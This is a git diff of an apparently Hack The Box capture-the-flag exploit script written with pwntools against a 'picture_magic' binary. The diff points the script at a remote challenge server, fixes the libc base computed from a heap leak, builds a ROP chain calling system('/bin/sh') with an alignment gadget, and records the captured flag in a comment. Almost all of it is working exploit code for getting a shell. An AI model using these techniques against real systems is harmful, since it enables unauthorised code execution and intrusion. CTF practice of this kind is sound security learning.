@@ -10,7 +10,8 @@ ld = ELF("./ld-2.36.so")
 context.binary = exe
 # context.log_level = 'debug'
 
-r = process('./picture_magic_patched')
+# r = process('./picture_magic_patched')
+r = remote('94.237.52.252', 45241)
 
 def gee():
     gdb.attach(r, gdbscript='''
@@ -171,7 +172,7 @@ def main():
     # modify the footer to calculate the size of the offset, which should take us back to the stack pointer
 
     sell(1, "0")
-    libc.address = int.from_bytes(libc_leak, byteorder='big')
+    libc.address = int.from_bytes(libc_leak, byteorder='big') - libc.sym.main_arena - 96
     system = libc.sym.system 
     print(f"System addr: {hex(system)}")
     binsh = next(libc.search(b"/bin/sh\x00"))
@@ -201,9 +202,12 @@ def main():
     #####
     pop_rdi = libc.address + 0x0000000000023b65
     print(f"pop rdi: {hex(pop_rdi)}")
-    gadgets = [pop_rdi, binsh, system]
+    print(f"libc address: {hex(libc.address)}")
+    ret = libc.address + 0x000000000010b39c
+    gadgets = [pop_rdi, binsh, ret, system] # need extra ret / nop instruction for alignment purposes along a 16 byte boundary
     gadgets = [int.to_bytes(i, byteorder='little', length=6) for i in gadgets]
-    gee()
+
+    # gee()
     for i, v in enumerate(gadgets):
         # transform(0, 'a', v-10, 157, i)
         for j in range(6):
@@ -218,11 +222,12 @@ def main():
     # dont think we need to fix rsi in this case 
     # pop_rsi = # need to get kinda of lucky with the rsi value because if it isn't 0x0 it might not work 
 
+    # r.sendlineafter("> ", "6")
     r.interactive()
     
 if __name__ == "__main__":
     main()
-
+    # HTB{h0u53_0f_31nh3rj4r_pu5h3d_b3y0nd_7h3_l1m17}
 
 
     
